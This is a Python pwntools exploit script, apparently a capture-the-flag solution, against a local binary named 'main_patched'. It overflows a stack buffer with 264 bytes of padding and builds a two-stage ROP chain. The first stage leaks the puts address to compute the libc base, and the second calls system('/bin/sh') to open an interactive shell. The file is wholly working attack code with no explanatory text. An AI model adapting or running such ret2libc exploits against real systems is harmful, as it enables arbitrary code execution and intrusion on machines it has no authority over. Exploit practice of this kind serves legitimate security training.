from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    gdb.attach(p, gdbscript='''
    b*0x00000000004013ba

    b*0x0000000000401388
    
    c
    ''')


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


p = process(exe.path)

# GDB()
##################################
### Stage 1: Leak libc address ###
##################################
input()
p.sendafter(b'> ', b'A'*4000)
p.sendafter(b'> ', b'A'*2969)
sa(b'> ', b'Y')

pop_rdi = 0x00000000004014b3
'''
payload = b'A'*(264) + flat(
    pop_rdi, exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
'''

payload = b'A' * 264
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

sa(b'now.\n', payload)
p.recvuntil(b'friend!\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
info("Libc base: " + hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
p.sendafter(b'> ', b'A'*4000)
p.sendafter(b'> ', b'A'*2969)
sa(b'> ', b'Y')

pop_rdi = 0x00000000004014b3
payload = b'A'*(264) + flat(
    0x000000000040101a,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system'] + 9
)
sa(b'now.\n', payload)

p.interactive()
